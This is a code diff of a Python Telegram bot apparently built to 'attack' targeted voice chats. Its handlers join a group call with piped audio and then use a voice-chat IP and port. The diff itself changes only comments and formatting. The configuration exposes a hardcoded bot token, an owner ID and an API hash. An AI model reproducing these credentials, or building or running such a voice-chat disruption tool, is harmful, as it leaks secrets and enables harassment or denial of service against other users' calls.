@@ -13,19 +13,17 @@ import numpy as np
 
 from pyrogram import Client, filters
 from pyrogram.types import Message
-
-# PyTgCalls import
 from pytgcalls import PyTgCalls
 from pytgcalls.types import AudioPiped
 
 # ═══════════════════════════════════════════════════
-# CONFIGURATION - YAHAN CHANGE KAREIN
+# CONFIGURATION - 🔴 YAHAN CHANGE KAREIN
 # ═══════════════════════════════════════════════════
 
 BOT_TOKEN = "8524730431:AAGORdQFDXoDWtb6oeVD41aRBCd3x6YLNKQ"
 OWNER_ID = 7302427268
 
-# 🔴🔴🔴 YAHAN APNA SESSION_STRING DAALO 🔴🔴🔴
+# 🔴🔴🔴 APNA SESSION_STRING YAHAN DAALO 🔴🔴🔴
 SESSION_STRING = "BQAN3s...apna_session_string..."
 
 AUDIO_DURATION = 20
@@ -298,11 +296,7 @@ async def attack_cmd(client, message: Message):
         
         pytgcalls = bot_state["pytgcalls"]
         
-        # Join voice chat with audio
-        await pytgcalls.join_group_call(
-            chat_id, 
-            AudioPiped(audio_buf)
-        )
+        await pytgcalls.join_group_call(chat_id, AudioPiped(audio_buf))
         await message.reply(f"[✅] Audio playing for {AUDIO_DURATION}s")
         
         if vc_ip and vc_port:
@@ -441,7 +435,6 @@ async def main():
     print("[🤖] Starting Telegram Bot...")
     bot = Client("bot", bot_token=BOT_TOKEN, api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e")
     
-    # Register handlers
     bot.on_message(filters.command("start"))(start_cmd)
     bot.on_message(filters.command("status"))(status_cmd)
     bot.on_message(filters.command("target"))(target_cmd)
